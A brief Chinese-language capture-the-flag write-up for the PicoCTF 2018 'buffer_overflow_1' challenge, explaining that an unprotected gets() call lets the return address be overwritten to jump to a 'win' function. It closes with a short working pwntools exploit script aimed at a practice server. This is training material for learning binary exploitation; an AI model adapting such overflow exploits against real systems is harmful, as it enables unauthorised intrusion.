程序本身是完全不开安全机制的

![image-20201203101253157](https://static.hack1s.fun/images/2021/02/06/image-20201203101253157.png)

出现问题的函数

![image-20201203101343293](https://static.hack1s.fun/images/2021/02/06/image-20201203101343293.png)

这个gets直接导致溢出

返回地址是用这个`get_return_address`获取的

在程序中还有一个后门函数

![image-20201203101657362](https://static.hack1s.fun/images/2021/02/06/image-20201203101657362.png)

溢出gets之后控制返回地址到这个win就可以了

```python
from pwn import *

io = remote('node3.buuoj.cn',27887)
#io = process('./PicoCTF_2018_buffer_overflow_1')
elf = ELF('./PicoCTF_2018_buffer_overflow_1')

payload  = bytes('a'*0x28+'b'*0x4,'ascii') + p32(elf.sym['win'])

io.sendline(payload)
io.interactive()
```

